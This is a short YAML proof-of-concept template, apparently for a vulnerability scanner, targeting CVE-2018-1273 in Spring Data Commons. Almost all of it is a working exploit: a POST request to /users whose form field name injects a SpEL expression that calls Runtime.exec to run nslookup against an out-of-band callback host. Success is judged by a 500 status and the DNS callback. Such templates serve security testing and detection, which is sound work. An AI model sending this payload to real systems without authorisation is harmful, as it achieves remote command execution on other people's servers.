name: poc-yaml-spring-cve-2018-1273
set:
  reverse: newReverse()
  reverseDomain: reverse.domain
  reverseIP: reverse.ip
rules:
  - method: POST
    path: /users
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: >-
      username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec('nslookup {{reverseDomain}} {{reverseIP}}')]=&password=&repeatedPassword=
    expression: >
      response.status == 500 && reverse.wait(5)
detail:
  author: Soveless(https://github.com/Soveless)
  Affected Version: "Spring Data Commons < 2.0.5"
  links:
    - https://github.com/vulhub/vulhub/tree/master/spring/CVE-2018-1273